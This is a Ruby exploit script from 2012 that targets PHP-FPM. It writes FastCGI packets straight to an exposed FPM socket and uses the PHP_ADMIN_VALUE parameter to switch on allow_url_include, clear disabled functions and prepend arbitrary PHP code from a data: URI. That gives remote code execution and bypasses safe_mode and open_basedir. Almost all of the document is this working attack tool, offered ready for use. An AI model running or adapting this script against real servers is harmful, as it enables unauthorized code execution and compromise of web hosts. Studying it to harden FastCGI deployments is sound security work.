#!/usr/bin/ruby
# coding: ASCII-8BIT
 
# Exploit Title: PHP-FPM universal SSRF bypass safe_mode/disabled_functions/open_basedir/etc
# redefine any php.ini values, not specified in php_admin_value
# SSRF - Server Side Request Forgery
# additional info about techinuque: http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities
# Google Dork: not relevant
# Date: 21/11/12
# Exploit Author: @ONsec_lab http://lab.onsec.ru
# Vendor Homepage: php.net fastcgi.com
# Software Link: php-fpm.org
# Version: all
# Tested on: all
# CVE : not a vuln (bug by design)
 
require 'socket'
require 'base64'
 
 
class FCGIRecord
 
  class BeginRequest < FCGIRecord
    def initialize( id)
      @id = id
      @type = 1
      @data = "\x00\x01\x00\x00\x00\x00\x00\x00"
    end
  end
 
  class Params < FCGIRecord
    def initialize( id, params = {})
      @id = id
      @type = 4
      @data = ""
      params.each do |k,v|
        @data << [ k.to_s.length, (1<<31) | v.to_s.length ].pack( "CN")
        @data << k.to_s
        @data << v.to_s
      end
    end
  end
 
 
  def initialize( id, type)
    @id = id
    @type = type
    @data = ""
  end
 
  def to_s
    packet = "\x01%c%c%c%c%c%c\x00" % [
      type,
      id / 256, id % 256,
      data.length / 256, data.length % 256,
      data.length % 8
    ]
    packet << data
    packet << "\x00" * (data.length % 8)
  end
 
  private
  attr_reader :id, :type, :data
end
 
 
if ARGV.count < 3 or ARGV.count > 4
  STDERR.write "Usage: #{$0} ( -u /path/to/socket | addr port ) [ /path/to/any/exists/file.php ] 'some php code to execute'\n"
  exit 1
end
 
 
script = ARGV.count == 4 ? ARGV[2] : "/usr/share/php/PEAR.php"
# command = Base64.encode64(ARGV.last.strip).strip.gsub( '=', '%3d').gsub( '/', '%2f')
command = ARGV.last.strip
 
packet = ""
packet << FCGIRecord::BeginRequest.new( 1).to_s
packet << FCGIRecord::Params.new( 1,
                                  "SERVER_NAME" => "127.0.0.1",
                                  "REQUEST_METHOD" => "GET",
                                  "SCRIPT_FILENAME" => script,
                                  "PHP_ADMIN_VALUE" => [
                                      "allow_url_include=On",
                                      "disable_functions=",
                                      "auto_prepend_file=data:,#{command}"
                                      ].join( "\n")
                                  ).to_s
packet << FCGIRecord::Params.new( 1).to_s
packet << FCGIRecord.new( 1, 5).to_s
 
#print packet.split('').map{ |c| '\x%02x' % c[0].ord }.join
 
 
fcgisock = ARGV[0] == '-u' ? UNIXSocket.new( ARGV[1]) : TCPSocket.new( ARGV[0], ARGV[1])
fcgisock.write( packet)
 
puts fcgisock.read
